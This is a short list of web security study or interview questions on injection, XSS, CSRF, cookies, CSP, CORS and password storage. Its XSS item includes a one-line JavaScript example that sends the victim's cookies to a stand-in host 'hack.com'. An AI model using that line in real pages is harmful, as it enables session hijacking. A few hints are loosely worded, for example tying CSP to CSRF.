# Security Questions

- What is an Injection attack? How do you guard against injection attacks? (sanitize input, don't allow full sql statements, create function that accepts just the parameters - you can use an ORM, which will handle this for you.)
- What are vulnerabilities? How do guard against vulnerabilities being exploited? (mention synk)
- How is the value of logging?
- What is HTTPS?
- What is XSS? (used for session hijacking by attaching cookies to query param - window.location = 'hack.com?cookie=' + document.cookie)
- What is CSRF? 
- How do secure + httpOnly cookie settings help with CSRF?
- What are Content Security Policies? How can they help with CSRF?
- What are environment variables? How do they aid in security?
- What security concerns do you have to be aware of when committing to a remote repository?
- What does the helmet package do?
- What is the principle of least privilege?
- What is CORS? What is the cors library?
- How should you store passwords in databases?
- What can you do if someone bombards your server with requests?